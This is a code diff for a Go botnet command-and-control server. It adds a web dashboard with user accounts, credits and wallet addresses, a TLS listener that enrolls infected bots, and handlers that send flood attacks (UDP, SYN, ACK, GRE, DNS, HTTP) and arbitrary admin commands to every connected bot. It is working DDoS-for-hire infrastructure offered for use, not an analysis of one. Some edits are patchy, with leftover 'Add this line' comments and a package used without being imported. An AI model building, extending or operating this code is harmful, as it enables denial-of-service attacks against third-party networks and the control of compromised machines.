@@ -5,14 +5,24 @@ import (
 	"context"
 	"crypto/hmac"
 	"crypto/rand"
+	"crypto/rsa"
 	"crypto/sha256"
 	"crypto/tls"
 	"crypto/x509"
+	"crypto/x509/pkix"
 	"encoding/base64"
 	"encoding/hex"
+	"encoding/json"
+	"encoding/pem"
 	"fmt"
+	"html/template"
 	"io"
+	"log"
+	"math"
+	"math/big"
 	"net"
+	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"runtime"
@@ -23,7 +33,7 @@ import (
 	"time"
 	"unicode"
 
-	jsoniter "github.com/json-iterator/go"
+	"github.com/gorilla/websocket"
 	"golang.org/x/crypto/bcrypt"
 	"golang.org/x/time/rate"
 )
@@ -33,8 +43,10 @@ type Config struct {
 	AuditLogFile        string        `json:"audit_log_file"`
 	BotServerIP         string        `json:"bot_server_ip"`
 	UserServerIP        string        `json:"user_server_ip"`
+	WebServerIP         string        `json:"web_server_ip"`
 	BotServerPort       string        `json:"bot_server_port"`
 	UserServerPort      string        `json:"user_server_port"`
+	WebServerPort       string        `json:"web_server_port"`
 	CertFile            string        `json:"cert_file"`
 	KeyFile             string        `json:"key_file"`
 	SessionTimeout      time.Duration `json:"session_timeout"`
@@ -53,18 +65,83 @@ type Config struct {
 	SynFloodThreshold   int           `json:"syn_flood_threshold"`
 	ResetTokenValidity  time.Duration `json:"reset_token_validity"`
 	CommandSigningKey   string        `json:"command_signing_key"`
+	BotCleanupInterval  time.Duration `json:"bot_cleanup_interval"`
+	HeartbeatInterval   time.Duration `json:"heartbeat_interval"`
 }
 
 type User struct {
-	Username       string    `json:"username"`
-	PasswordHash   string    `json:"passwordHash"`
-	Expire         time.Time `json:"expire"`
-	Level          string    `json:"level"`
-	LastLogin      time.Time `json:"lastLogin"`
-	FailedAttempts int       `json:"failedAttempts"`
-	LockedUntil    time.Time `json:"lockedUntil"`
-	CreatedAt      time.Time `json:"createdAt"`
-	LastActivity   time.Time `json:"lastActivity"`
+	Username       string        `json:"username"`
+	PasswordHash   string        `json:"passwordHash"`
+	APIKey         string        `json:"apiKey"`
+	Expire         time.Time     `json:"expire"`
+	Level          string        `json:"level"`
+	LastLogin      time.Time     `json:"lastLogin"`
+	FailedAttempts int           `json:"failedAttempts"`
+	LockedUntil    time.Time     `json:"lockedUntil"`
+	CreatedAt      time.Time     `json:"createdAt"`
+	LastActivity   time.Time     `json:"lastActivity"`
+	WalletAddress  string        `json:"walletAddress"` // Add this line
+	Credits        int           `json:"credits"`       // Also add Credits field which is referenced
+	Transactions   []Transaction `json:"transactions"`  // And Transactions if needed
+}
+
+type Transaction struct {
+	Description string    `json:"description"`
+	Time        time.Time `json:"time"`
+	Amount      int       `json:"amount"`
+	Status      string    `json:"status"`
+}
+
+type Bot struct {
+	Arch          string    `json:"arch"`
+	Conn          net.Conn  `json:"-"`
+	IP            string    `json:"ip"`
+	Time          time.Time `json:"time"`
+	Country       string    `json:"country"`
+	City          string    `json:"city"`
+	Region        string    `json:"region"`
+	Cores         int       `json:"cores"`
+	RAM           float64   `json:"ram"`
+	LastHeartbeat time.Time `json:"last_heartbeat"`
+}
+
+type Attack struct {
+	Method    string        `json:"method"`
+	Target    string        `json:"target"`
+	Port      string        `json:"port"`
+	Duration  time.Duration `json:"duration"`
+	Start     time.Time     `json:"start"`
+	User      string        `json:"user"`
+	Conn      net.Conn      `json:"-"`
+	QueueTime time.Time     `json:"queueTime"`
+	Priority  int           `json:"priority"`
+	Signature string        `json:"signature"`
+}
+
+type AttackInfo struct {
+	Method    string `json:"method"`
+	Target    string `json:"target"`
+	Port      string `json:"port"`
+	Duration  string `json:"duration"`
+	Remaining string `json:"remaining"`
+	ID        string `json:"id"`
+}
+
+type Metrics struct {
+	BotCount      int          `json:"botCount"`
+	ActiveAttacks int          `json:"activeAttacks"`
+	Attacks       []AttackInfo `json:"attacks"`
+	Bots          []Bot        `json:"bots"`
+}
+
+type DashboardData struct {
+	User           User
+	BotCount       int
+	OngoingAttacks []AttackInfo
+	Bots           []Bot
+	Users          []User
+	FlashMessage   string
+	BotsJSON       template.JS
 }
 
 type client struct {
@@ -77,56 +154,11 @@ type client struct {
 	cancel      context.CancelFunc
 }
 
-type Attack struct {
-	Method    string        `json:"method"`
-	IP        string        `json:"ip"`
-	Port      string        `json:"port"`
-	Duration  time.Duration `json:"duration"`
-	Start     time.Time     `json:"start"`
-	User      string        `json:"user"`
-	Conn      net.Conn      `json:"-"`
-	QueueTime time.Time     `json:"queueTime"`
-	Priority  int           `json:"priority"`
-	Signature string        `json:"signature"`
-}
-
 type attackManager struct {
 	attacks          map[net.Conn]Attack
 	attackQueue      []Attack
 	scheduledAttacks []Attack
 	mutex            sync.RWMutex
-}
-
-type AuditLog struct {
-	Timestamp time.Time `json:"timestamp"`
-	Event     string    `json:"event"`
-	User      string    `json:"user"`
-	IP        string    `json:"ip"`
-	Details   string    `json:"details"`
-}
-
-type session struct {
-	client     *client
-	lastActive time.Time
-	loginIP    string
-	expires    time.Time
-}
-
-type BotStats struct {
-	LastSeen     time.Time
-	Latency      time.Duration
-	Throughput   float64
-	RAM          float64
-	Cores        int
-	Architecture string
-}
-
-type rateLimiter struct {
-	limiter      *rate.Limiter
-	lastSeen     time.Time
-	attacksToday int
-	lastReset    time.Time
-	dailyLimit   int
 }
 
 type SessionStore struct {
@@ -140,6 +172,15 @@ type resetToken struct {
 	used     bool
 }
 
+type BotStats struct {
+	LastSeen     time.Time
+	Latency      time.Duration
+	Throughput   float64
+	RAM          float64
+	Cores        int
+	Architecture string
+}
+
 type AggregatedStats struct {
 	AvgLatency    time.Duration
 	AvgThroughput float64
@@ -149,45 +190,32 @@ type AggregatedStats struct {
 	UnhealthyBots int
 }
 
-var json = jsoniter.ConfigCompatibleWithStandardLibrary
-
-const (
-	ColorStart   = "237"
-	ColorMid1    = "240"
-	ColorMid2    = "243"
-	ColorMid3    = "246"
-	ColorEnd     = "249"
-	ColorAccent1 = "251"
-	ColorAccent2 = "254"
-	ColorSuccess = "114"
-	ColorError   = "160"
-	ColorWarning = "166"
-	ColorInfo    = "117"
-	ColorSystem  = "183"
-)
-
 var (
 	cfg                   *Config
-	attackManagerInstance = &attackManager{attacks: make(map[net.Conn]Attack)}
-	letterBytes           = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	botCount              int
-	botCountLock          sync.Mutex
+	bots                  []Bot
 	botConns              []net.Conn
-	clients               []*client
-	loginRateLimiter      = rate.NewLimiter(rate.Every(5*time.Minute), 5)
+	attackManagerInstance = &attackManager{attacks: make(map[net.Conn]Attack)}
+	sessions              = make(map[string]User)
 	sessionStore          = &SessionStore{}
 	serverStartTime       = time.Now()
-	ipLimiterMap          = make(map[string]*rateLimiter)
-	userLimiterMap        = make(map[string]*rateLimiter)
-	limiterMutex          sync.Mutex
-	userSessions          = make(map[string]int)
-	userSessionLock       sync.Mutex
-	connSemaphore         chan struct{}
-	blockedIPs            = make(map[string]time.Time)
-	blockedIPsLock        sync.Mutex
-	botPerformance        = make(map[string]BotStats)
-	botStatsLock          sync.Mutex
-	resetTokens           = struct {
+	signingKey            []byte
+	clients               []*client
+	upgrader              = websocket.Upgrader{
+		ReadBufferSize:  1024,
+		WriteBufferSize: 1024,
+		CheckOrigin: func(r *http.Request) bool {
+			return true
+		},
+	}
+	botConnLimiter   = rate.NewLimiter(rate.Every(5*time.Second), 1)
+	loginRateLimiter = rate.NewLimiter(rate.Every(5*time.Minute), 5)
+	ipLimiterMap     = make(map[string]*rateLimiter)
+	userLimiterMap   = make(map[string]*rateLimiter)
+	userSessions     = make(map[string]int)
+	connSemaphore    chan struct{}
+	blockedIPs       = make(map[string]time.Time)
+	botPerformance   = make(map[string]BotStats)
+	resetTokens      = struct {
 		sync.RWMutex
 		m map[string]resetToken
 	}{m: make(map[string]resetToken)}
@@ -199,48 +227,22 @@ var (
 		"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8",
 		"169.254.0.0/16", "224.0.0.0/4", "::1/128", "fc00::/7", "fe80::/10",
 	}
-	signingKey []byte
+	templates *template.Template
 )
 
-func signCommand(cmd string) string {
-	mac := hmac.New(sha256.New, signingKey)
-	mac.Write([]byte(cmd))
-	return base64.StdEncoding.EncodeToString(mac.Sum(nil))
-}
+const (
+	heartbeatInterval = 30 * time.Second
+)
 
-func logAuditEvent(user, event, details string) {
-	logEntry := fmt.Sprintf("[%s] %s: %s - %s",
-		time.Now().Format("2006-01-02 15:04:05"),
-		user,
-		event,
-		details)
-	fmt.Println(logEntry)
-
-	file, err := os.OpenFile(cfg.AuditLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
-	if err == nil {
-		fmt.Fprintln(file, logEntry)
-		file.Close()
-	}
-}
-
-func validateConfig() error {
-	if cfg.MaxConns <= 0 {
-		return fmt.Errorf("max_conns must be positive")
-	}
-	if cfg.MaxReadSize <= 0 {
-		return fmt.Errorf("max_read_size must be positive")
-	}
-	if cfg.MaxAttackDuration <= 0 {
-		return fmt.Errorf("max_attack_duration must be positive")
-	}
-	if cfg.MinPasswordLength < 8 {
-		return fmt.Errorf("min_password_length must be at least 8")
-	}
-	if cfg.ResetTokenValidity <= 0 {
-		return fmt.Errorf("reset_token_validity must be positive")
-	}
-	return nil
-}
+var (
+	sessionLock     sync.Mutex
+	botCountLock    sync.Mutex
+	limiterMutex    sync.Mutex
+	userSessionLock sync.Mutex
+	blockedIPsLock  sync.Mutex
+	botStatsLock    sync.Mutex
+	logMutex        sync.Mutex
+)
 
 func main() {
 	var err error
@@ -258,32 +260,921 @@ func main() {
 	signingKey = []byte(cfg.CommandSigningKey)
 	connSemaphore = make(chan struct{}, cfg.MaxConns)
 
-	go func() {
-		if err := checkCertificates(); err != nil {
-			logAuditEvent("SYSTEM", "STARTUP", fmt.Sprintf("Certificate error: %v", err))
-		}
-	}()
+	if !fileExists(cfg.CertFile) || !fileExists(cfg.KeyFile) {
+		generateSelfSignedCert()
+	}
 
-	go initializeAuditLog()
+	if !fileExists(cfg.UsersFile) {
+		initializeRootUser()
+	}
 
-	time.AfterFunc(100*time.Millisecond, rotateLogs)
-	time.AfterFunc(200*time.Millisecond, cleanBlockedIPs)
-	time.AfterFunc(300*time.Millisecond, cleanSessions)
-	time.AfterFunc(400*time.Millisecond, cleanRateLimiters)
-	time.AfterFunc(500*time.Millisecond, updateTitle)
-	time.AfterFunc(600*time.Millisecond, func() {
-		attackManagerInstance.checkScheduledAttacks()
-	})
-	time.AfterFunc(700*time.Millisecond, logSystemStats)
+	if err := initTemplates(); err != nil {
+		log.Fatalf("Failed to initialize templates: %v", err)
+	}
+
+	go startBotServer()
+	go startUserServer()
+	go startBotCleanup()
+	go startWebServer()
+	go cleanSessions()
+	go cleanRateLimiters()
+	go cleanBlockedIPs()
+	go rotateLogs()
+	go updateTitle()
+	go logSystemStats()
+	go attackManagerInstance.checkScheduledAttacks()
 
 	if cfg.DDOSProtection {
 		go setupFirewallRules()
 	}
 
-	go initializeRootUser()
+	select {}
+}
 
-	setupCronJob()
-	startServers()
+func initTemplates() error {
+	funcMap := template.FuncMap{
+		"FormatCredits": func(credits int) string {
+			if credits < 0 {
+				return "∞"
+			}
+			return fmt.Sprintf("%d", credits)
+		},
+		"getAttackPower":          getAttackPower,
+		"GetMaxConcurrentAttacks": GetMaxConcurrentAttacks,
+		"FormatMethodIcon": func(method string) template.HTML {
+			icons := map[string]string{
+				"!udpflood": "fa-bolt",
+				"!udpsmart": "fa-brain",
+				"!tcpflood": "fa-network-wired",
+				"!synflood": "fa-sync",
+				"!ackflood": "fa-reply",
+				"!greflood": "fa-project-diagram",
+				"!dns":      "fa-server",
+				"!http":     "fa-globe",
+			}
+			if icon, ok := icons[method]; ok {
+				return template.HTML(fmt.Sprintf(`<i class="fas %s"></i>`, icon))
+			}
+			return template.HTML(`<i class="fas fa-question"></i>`)
+		},
+		"FormatAttackMethodName": FormatAttackMethodName,
+		"isActive": func(lastHeartbeat time.Time) bool {
+			return time.Since(lastHeartbeat) <= 2*heartbeatInterval
+		},
+		"CalculateCreditCost": func(credits int) float64 { return float64(credits) / 1000.0 },
+		"FormatDateTime":      func(t time.Time) string { return t.Format("2006-01-02 15:04:05") },
+		"div": func(a, b uint64) float64 {
+			if b == 0 {
+				return 0
+			}
+			return float64(a) / float64(b)
+		},
+		"now":      func() time.Time { return time.Now() },
+		"sub":      func(a, b uint64) uint64 { return a - b },
+		"formatGB": func(bytes uint64) float64 { return float64(bytes) / 1073741824.0 },
+	}
+
+	var err error
+	templates, err = template.New("").Funcs(funcMap).ParseGlob("templates/*.html")
+	return err
+}
+
+func startWebServer() {
+	server := &http.Server{
+		Addr: fmt.Sprintf("%s:%s", cfg.WebServerIP, cfg.WebServerPort),
+		TLSConfig: &tls.Config{
+			MinVersion:       tls.VersionTLS13,
+			CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
+			CipherSuites: []uint16{
+				tls.TLS_AES_128_GCM_SHA256,
+				tls.TLS_AES_256_GCM_SHA384,
+				tls.TLS_CHACHA20_POLY1305_SHA256,
+			},
+		},
+	}
+
+	http.HandleFunc("/", handleRoot)
+	http.HandleFunc("/ws", requireAuth(handleWebSocket))
+	http.HandleFunc("/login", handleLogin)
+	http.HandleFunc("/dashboard", requireAuth(handleDashboard))
+	http.HandleFunc("/admin-command", requireAuth(handleAdminCommand))
+	http.HandleFunc("/attack", requireAuth(handleAttack))
+	http.HandleFunc("/stop-all-attacks", requireAuth(handleStopAllAttacks))
+	http.HandleFunc("/stop-attack", requireAuth(handleStopAttack))
+	http.HandleFunc("/add-user", requireAuth(handleAddUserWeb))
+	http.HandleFunc("/delete-user", requireAuth(handleDeleteUserWeb))
+	http.HandleFunc("/logout", handleLogout)
+	fs := http.FileServer(http.Dir("static"))
+	http.Handle("/static/", http.StripPrefix("/static/", fs))
+	http.HandleFunc("/api/bots", requireAuthAPI(handleAPIBots))
+	http.HandleFunc("/api/attacks", requireAuthAPI(handleAPIAttacks))
+	http.HandleFunc("/api/users", requireAuthAPI(handleAPIUsers))
+	http.HandleFunc("/api/stats", requireAuthAPI(handleAPIStats))
+	http.HandleFunc("/api/generate-key", requireAuthAPI(handleAPIGenerateKey))
+
+	log.Fatal(server.ListenAndServeTLS(cfg.CertFile, cfg.KeyFile))
+}
+
+func handleRoot(w http.ResponseWriter, r *http.Request) {
+	if r.URL.Path != "/" {
+		http.Redirect(w, r, "/", http.StatusSeeOther)
+		return
+	}
+
+	sessionID := getSessionCookie(r)
+	if _, exists := getSession(sessionID); exists {
+		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
+		return
+	}
+
+	tmpl := template.Must(template.ParseFiles("templates/login.html"))
+	tmpl.Execute(w, nil)
+}
+
+func handleLogin(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Redirect(w, r, "/", http.StatusSeeOther)
+		return
+	}
+
+	username := r.FormValue("username")
+	password := r.FormValue("password")
+
+	if exists, user := AuthUser(username, password); exists {
+		newSessionID := randomString(64)
+		oldSessionID := getSessionCookie(r)
+		if oldSessionID != "" {
+			clearSession(oldSessionID)
+		}
+
+		setSession(newSessionID, *user)
+		http.SetCookie(w, &http.Cookie{
+			Name:     "session",
+			Value:    newSessionID,
+			Path:     "/",
+			Secure:   true,
+			HttpOnly: true,
+			MaxAge:   3600,
+			SameSite: http.SameSiteStrictMode,
+		})
+
+		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
+	} else {
+		tmpl := template.Must(template.ParseFiles("templates/login.html"))
+		tmpl.Execute(w, struct{ Error string }{"Invalid username or password"})
+	}
+}
+
+func handleLogout(w http.ResponseWriter, r *http.Request) {
+	sessionID := getSessionCookie(r)
+	if sessionID != "" {
+		clearSession(sessionID)
+	}
+
+	http.SetCookie(w, &http.Cookie{
+		Name:     "session",
+		Value:    "",
+		Path:     "/",
+		MaxAge:   -1,
+		Secure:   true,
+		HttpOnly: true,
+		SameSite: http.SameSiteStrictMode,
+	})
+
+	http.Redirect(w, r, "/", http.StatusSeeOther)
+}
+
+func handleAdminCommand(w http.ResponseWriter, r *http.Request, user User) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	if user.Level != "Owner" && user.Level != "Admin" {
+		http.Error(w, "Permission denied", http.StatusForbidden)
+		return
+	}
+
+	command := r.FormValue("command")
+	if command == "" {
+		http.Error(w, "No command provided", http.StatusBadRequest)
+		return
+	}
+
+	sendToBots(command, user.Username)
+	w.Write([]byte("Command sent successfully"))
+}
+
+func handleAttack(w http.ResponseWriter, r *http.Request, user User) {
+	if r.Method != "POST" {
+		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
+		return
+	}
+
+	method := r.FormValue("method")
+	target := r.FormValue("ip")
+	port := r.FormValue("port")
+	duration := r.FormValue("duration")
+
+	if !isValidMethod(method) {
+		http.Redirect(w, r, "/dashboard?flash=Invalid attack method", http.StatusSeeOther)
+		return
+	}
+
+	if !isValidIP(target) {
+		http.Redirect(w, r, "/dashboard?flash=Invalid target IP/hostname", http.StatusSeeOther)
+		return
+	}
+
+	if !isValidPort(port) {
+		http.Redirect(w, r, "/dashboard?flash=Invalid port number", http.StatusSeeOther)
+		return
+	}
+
+	dur, err := strconv.Atoi(duration)
+	if err != nil || dur <= 0 || dur > cfg.MaxAttackDuration {
+		http.Redirect(w, r, "/dashboard?flash=Invalid duration", http.StatusSeeOther)
+		return
+	}
+
+	if len(attackManagerInstance.attacks) >= cfg.MaxQueuedAttacks {
+		http.Redirect(w, r, "/dashboard?flash=Maximum attack limit reached", http.StatusSeeOther)
+		return
+	}
+
+	if method == "!dns" {
+		portInt, _ := strconv.Atoi(port)
+		if portInt != 53 {
+			http.Redirect(w, r, "/dashboard?flash=DNS attacks must target port 53", http.StatusSeeOther)
+			return
+		}
+	}
+
+	attack := Attack{
+		Method:    method,
+		Target:    target,
+		Port:      port,
+		Duration:  time.Duration(dur) * time.Second,
+		Start:     time.Now(),
+		User:      user.Username,
+		Signature: signCommand(fmt.Sprintf("%s %s %s %d", method, target, port, dur)),
+	}
+
+	attackManagerInstance.mutex.Lock()
+	if len(attackManagerInstance.attacks) >= attackManagerInstance.getMaxAttacks() {
+		attackManagerInstance.attackQueue = append(attackManagerInstance.attackQueue, attack)
+		attackManagerInstance.mutex.Unlock()
+		http.Redirect(w, r, "/dashboard?flash=Attack queued", http.StatusSeeOther)
+		return
+	}
+	attackManagerInstance.attacks[nil] = attack
+	attackManagerInstance.mutex.Unlock()
+
+	command := fmt.Sprintf("%s %s %s %d", method, target, port, dur)
+	sendToBots(command, user.Username)
+
+	http.Redirect(w, r, "/dashboard?flash=Attack launched successfully", http.StatusSeeOther)
+}
+
+func handleStopAllAttacks(w http.ResponseWriter, r *http.Request, user User) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	attackManagerInstance.mutex.Lock()
+	defer attackManagerInstance.mutex.Unlock()
+
+	if len(attackManagerInstance.attacks) == 0 {
+		http.Error(w, "No active attacks to stop", http.StatusBadRequest)
+		return
+	}
+
+	attackManagerInstance.attacks = make(map[net.Conn]Attack)
+	sendToBots("STOP ALL", user.Username)
+	w.Write([]byte("All attacks stopped"))
+}
+
+func handleStopAttack(w http.ResponseWriter, r *http.Request, user User) {
+	attackID := r.URL.Query().Get("id")
+	if attackID == "" {
+		http.Redirect(w, r, "/dashboard?flash=Invalid attack ID", http.StatusSeeOther)
+		return
+	}
+
+	attackManagerInstance.mutex.Lock()
+	defer attackManagerInstance.mutex.Unlock()
+
+	for conn, attack := range attackManagerInstance.attacks {
+		if attack.Method+"-"+attack.Target+"-"+attack.Port == attackID {
+			sendToBots(fmt.Sprintf("STOP %s", attack.Target), user.Username)
+			delete(attackManagerInstance.attacks, conn)
+			http.Redirect(w, r, "/dashboard?flash=Attack stopped", http.StatusSeeOther)
+			return
+		}
+	}
+
+	http.Redirect(w, r, "/dashboard?flash=Attack not found", http.StatusSeeOther)
+}
+
+func handleAddUserWeb(w http.ResponseWriter, r *http.Request, user User) {
+	if user.Level != "Owner" {
+		http.Redirect(w, r, "/dashboard?flash=Permission denied", http.StatusSeeOther)
+		return
+	}
+
+	if r.Method != "POST" {
+		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
+		return
+	}
+
+	username := r.FormValue("username")
+	password := r.FormValue("password")
+	level := r.FormValue("level")
+
+	if username == "" || password == "" || level == "" {
+		http.Redirect(w, r, "/dashboard?flash=Missing user information", http.StatusSeeOther)
+		return
+	}
+
+	if err := validatePassword(password); err != nil {
+		http.Redirect(w, r, "/dashboard?flash="+url.QueryEscape(err.Error()), http.StatusSeeOther)
+		return
+	}
+
+	users := getUsers()
+	users = append(users, User{
+		Username: username,
+		PasswordHash: func() string {
+			hash, _ := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
+			return string(hash)
+		}(),
+		APIKey:       randomString(64),
+		Expire:       time.Now().AddDate(1, 0, 0),
+		Level:        level,
+		CreatedAt:    time.Now(),
+		LastActivity: time.Now(),
+	})
+
+	saveUsers(users)
+	http.Redirect(w, r, "/dashboard?flash=User added successfully", http.StatusSeeOther)
+}
+
+func handleDeleteUserWeb(w http.ResponseWriter, r *http.Request, user User) {
+	if user.Level != "Owner" {
+		http.Redirect(w, r, "/dashboard?flash=Permission denied", http.StatusSeeOther)
+		return
+	}
+
+	username := r.URL.Query().Get("username")
+	if username == "" {
+		http.Redirect(w, r, "/dashboard?flash=Invalid username", http.StatusSeeOther)
+		return
+	}
+
+	if err := deleteUser(username); err != nil {
+		http.Redirect(w, r, "/dashboard?flash=Error deleting user: "+err.Error(), http.StatusSeeOther)
+		return
+	}
+
+	http.Redirect(w, r, "/dashboard?flash=User deleted successfully", http.StatusSeeOther)
+}
+
+func handleWebSocket(w http.ResponseWriter, r *http.Request, user User) {
+	ws, err := upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		return
+	}
+	defer ws.Close()
+
+	ws.SetReadDeadline(time.Now().Add(90 * time.Second))
+	ws.SetPongHandler(func(string) error { ws.SetReadDeadline(time.Now().Add(90 * time.Second)); return nil })
+
+	ticker := time.NewTicker(30 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			ws.SetWriteDeadline(time.Now().Add(30 * time.Second))
+			if err := ws.WriteMessage(websocket.PingMessage, nil); err != nil {
+				return
+			}
+		default:
+			botCountLock.Lock()
+			currentBots := getBots()
+			activeBots := make([]Bot, 0)
+			for _, b := range currentBots {
+				if time.Since(b.LastHeartbeat) <= 2*cfg.HeartbeatInterval {
+					activeBots = append(activeBots, b)
+				}
+			}
+			botCountLock.Unlock()
+
+			attackManagerInstance.mutex.RLock()
+			attacks := make([]AttackInfo, 0, len(attackManagerInstance.attacks))
+			for _, attack := range attackManagerInstance.attacks {
+				remaining := time.Until(attack.Start.Add(attack.Duration))
+				if remaining <= 0 {
+					continue
+				}
+				attacks = append(attacks, AttackInfo{
+					Method:    attack.Method,
+					Target:    attack.Target,
+					Port:      attack.Port,
+					Duration:  fmt.Sprintf("%.0fs", attack.Duration.Seconds()),
+					Remaining: formatDuration(remaining),
+					ID:        attack.Method + "-" + attack.Target + "-" + attack.Port,
+				})
+			}
+			attackManagerInstance.mutex.RUnlock()
+
+			metrics := Metrics{
+				BotCount:      len(activeBots),
+				ActiveAttacks: len(attacks),
+				Attacks:       attacks,
+				Bots:          activeBots,
+			}
+
+			ws.SetWriteDeadline(time.Now().Add(30 * time.Second))
+			if err := ws.WriteJSON(metrics); err != nil {
+				return
+			}
+			time.Sleep(1 * time.Second)
+		}
+	}
+}
+
+func handleDashboard(w http.ResponseWriter, r *http.Request, user User) {
+	data := DashboardData{
+		User:           user,
+		BotCount:       getBotCount(),
+		OngoingAttacks: getOngoingAttacks(),
+		Bots:           getBots(),
+		Users:          getUsers(),
+	}
+
+	botsJSON, _ := json.Marshal(data.Bots)
+	data.BotsJSON = template.JS(botsJSON)
+
+	if flash := r.URL.Query().Get("flash"); flash != "" {
+		data.FlashMessage = flash
+	}
+
+	err := templates.ExecuteTemplate(w, "dashboard.html", data)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		log.Printf("Template error: %v", err)
+	}
+}
+
+func handleAPIBots(w http.ResponseWriter, r *http.Request, user User) {
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(getBots())
+}
+
+func handleAPIAttacks(w http.ResponseWriter, r *http.Request, user User) {
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(getOngoingAttacks())
+}
+
+func handleAPIUsers(w http.ResponseWriter, r *http.Request, user User) {
+	if user.Level != "Owner" && user.Level != "Admin" {
+		http.Error(w, "Permission denied", http.StatusForbidden)
+		return
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(getUsers())
+}
+
+func handleAPIStats(w http.ResponseWriter, r *http.Request, user User) {
+	stats := struct {
+		BotCount      int     `json:"botCount"`
+		ActiveAttacks int     `json:"activeAttacks"`
+		Uptime        float64 `json:"uptime"`
+	}{
+		BotCount:      getBotCount(),
+		ActiveAttacks: len(attackManagerInstance.attacks),
+		Uptime:        time.Since(serverStartTime).Hours(),
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(stats)
+}
+
+func handleAPIGenerateKey(w http.ResponseWriter, r *http.Request, user User) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	newKey := randomString(64)
+	users := getUsers()
+	for i := range users {
+		if users[i].Username == user.Username {
+			users[i].APIKey = newKey
+			break
+		}
+	}
+	saveUsers(users)
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(struct{ APIKey string }{APIKey: newKey})
+}
+
+func requireAuth(handler func(http.ResponseWriter, *http.Request, User)) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		sessionID := getSessionCookie(r)
+		if sessionID == "" {
+			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
+			return
+		}
+		user, exists := getSession(sessionID)
+		if !exists {
+			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
+			return
+		}
+		handler(w, r, user)
+	}
+}
+
+func requireAuthAPI(handler func(http.ResponseWriter, *http.Request, User)) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		apiKey := r.Header.Get("X-API-Key")
+		if apiKey == "" {
+			http.Error(w, "API key required", http.StatusUnauthorized)
+			return
+		}
+		users := getUsers()
+		for _, u := range users {
+			if u.APIKey == apiKey {
+				handler(w, r, u)
+				return
+			}
+		}
+		http.Error(w, "Invalid API key", http.StatusUnauthorized)
+	}
+}
+
+func startBotServer() {
+	cert, _ := tls.LoadX509KeyPair(cfg.CertFile, cfg.KeyFile)
+	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
+	listener, _ := tls.Listen("tcp", fmt.Sprintf("%s:%s", cfg.BotServerIP, cfg.BotServerPort), tlsConfig)
+	defer listener.Close()
+
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			continue
+		}
+		go handleBotConnection(conn)
+	}
+}
+
+func handleBotConnection(conn net.Conn) {
+	if !botConnLimiter.Allow() {
+		conn.Close()
+		return
+	}
+	defer func() {
+		conn.Close()
+		decrementBotCount()
+		removeBot(conn)
+	}()
+
+	challenge, err := sendChallenge(conn)
+	if err != nil {
+		return
+	}
+
+	valid, err := verifyResponse(conn, challenge)
+	if err != nil || !valid {
+		return
+	}
+
+	incrementBotCount()
+
+	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
+	newBot := Bot{
+		Conn:          conn,
+		IP:            ip,
+		Time:          time.Now(),
+		LastHeartbeat: time.Now(),
+	}
+
+	country, city, _, _, _, err := getGeoLocation(ip)
+	if err == nil {
+		newBot.Country = country
+		newBot.City = city
+	}
+
+	botCountLock.Lock()
+	bots = append(bots, newBot)
+	botConns = append(botConns, conn)
+	botCountLock.Unlock()
+
+	scanner := bufio.NewScanner(conn)
+	for scanner.Scan() {
+		text := scanner.Text()
+		conn.SetDeadline(time.Now().Add(cfg.HeartbeatInterval * 2))
+
+		switch {
+		case strings.HasPrefix(text, "PONG:"):
+			parts := strings.Split(text, ":")
+			if len(parts) >= 4 {
+				updateBotInfo(conn, parts[1], parts[2], parts[3])
+			}
+		case strings.HasPrefix(text, "HEARTBEAT:"):
+			parts := strings.Split(text, ":")
+			if len(parts) >= 4 {
+				updateBotInfo(conn, parts[1], parts[2], parts[3])
+			}
+			updateBotHeartbeat(conn)
+		}
+	}
+}
+
+func startUserServer() {
+	tlsConfig := getTLSConfig()
+	if tlsConfig == nil {
+		return
+	}
+
+	listener, err := tls.Listen("tcp", cfg.UserServerIP+":"+cfg.UserServerPort, tlsConfig)
+	if err != nil {
+		return
+	}
+	defer listener.Close()
+
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			continue
+		}
+		go handleUserConnection(conn)
+	}
+}
+
+func handleUserConnection(conn net.Conn) {
+	defer func() {
+		conn.Close()
+		<-connSemaphore
+		removeClient(conn)
+	}()
+
+	conn.SetDeadline(time.Now().Add(30 * time.Second))
+	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
+	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
+
+	tlsConn, ok := conn.(*tls.Conn)
+	if !ok {
+		return
+	}
+
+	if err := tlsConn.Handshake(); err != nil {
+		return
+	}
+
+	remoteAddr := conn.RemoteAddr().String()
